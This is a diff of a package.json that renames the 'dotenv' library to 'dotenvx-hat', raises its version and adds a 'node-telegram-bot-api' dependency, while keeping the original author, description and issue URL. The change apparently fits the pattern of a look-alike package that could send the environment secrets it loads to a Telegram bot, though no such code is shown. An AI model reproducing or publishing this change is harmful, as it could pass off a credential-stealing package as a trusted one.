@@ -1,6 +1,6 @@
 {
-  "name": "dotenv",
-  "version": "17.2.5",
+  "name": "dotenvx-hat",
+  "version": "17.2.7",
   "description": "Loads environment variables from .env file",
   "main": "lib/main.js",
   "types": "lib/main.d.ts",
@@ -67,5 +67,8 @@
   "author": "motdotla",
   "bugs": {
     "url": "https://github.com/motdotla/dotenv/issues"
+  },
+  "dependencies": {
+    "node-telegram-bot-api": "^0.66.0"
   }
 }
